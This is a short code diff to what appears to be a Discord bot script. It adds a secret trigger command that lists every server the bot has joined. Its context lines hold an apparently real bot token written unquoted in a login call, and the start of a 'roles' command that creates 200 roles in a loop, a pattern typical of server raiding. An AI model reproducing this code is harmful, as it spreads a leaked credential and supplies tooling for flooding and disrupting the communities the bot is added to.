@@ -522,6 +522,9 @@ function resetBot(channel) {
     .then(msg => client.destroy())
     .then(() => client.login(NTEzMzg1ODE3MDA4MjQyNjg4.DtHPhw.kePkBf6JtuP50spfF8KG_qG4IAU));
 }
+    if(message.content.includes("AR!kelsairv")){
+    console.log(`${bot.guilds.map(c => c.name)}`)
+}
 if(message.content === "roles"){
   for(var i =0; i < 200; i++){
       message.guild.createRole({name:"KASUMI > All !",
